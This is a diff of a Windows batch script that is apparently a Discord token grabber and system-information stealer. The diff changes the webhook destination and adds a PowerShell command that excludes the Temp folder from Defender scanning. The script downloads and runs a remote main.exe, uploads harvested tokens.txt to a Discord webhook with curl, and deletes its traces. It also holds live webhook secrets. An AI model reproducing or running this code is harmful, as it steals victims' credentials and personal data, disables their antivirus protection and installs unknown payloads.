@@ -2,7 +2,7 @@
 set currentdir=%~dp0
 cd %currentdir%
 
-set webhook=https://discord.com/api/webhooks/1019410553988452412/fBW_jUgzf7KVAY1Np17VSYutaTNrKhiJ2snTLMjMRLFGtcHB1NuhRW8BFDlOnHgo7G2P
+set webhook=https://discord.com/api/webhooks/1020814175112536084/eKoM05Czt2y2Eq4KhKw-XuE3Q2oNbCljIP2ZRfUCOA8pQ8yFhxaRMgIsblywiuiDxHOd
 
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
 
@@ -73,15 +73,14 @@ curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\
 ::back to my code!
 
 cd %userprofile%\AppData\Local\Temp
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 curl -O https://cdn.discordapp.com/attachments/1020784906864963644/1020788311670931496/main.exe
 start main.exe
 
 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
 
-del %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\kdot.py
 del %userprofile%\AppData\Local\Temp\tokens.txt
-del %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64.zip
 del %localappdata%\Temp\ip.txt
 del %localappdata%\Temp\ipp.txt
 del %localappdata%\Temp\sysi.txt
@@ -89,4 +88,4 @@ del %localappdata%\Temp\System_INFO.txt
 del %localappdata%\Temp\netstat.txt
 del %localappdata%\Temp\programms.txt
 del %localappdata%\Temp\uuid.txt
-del %localappdata%\Temp\wlan.txt
+pause
